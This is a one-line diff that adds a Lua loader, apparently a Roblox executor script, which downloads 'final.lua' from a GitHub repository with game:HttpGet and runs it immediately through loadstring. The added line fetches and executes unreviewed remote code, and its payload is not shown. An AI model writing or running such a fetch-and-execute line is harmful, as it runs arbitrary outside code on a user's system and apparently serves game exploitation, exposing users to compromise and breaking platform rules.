@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evoincorp/newscripts/refs/heads/main/final.lua"))()
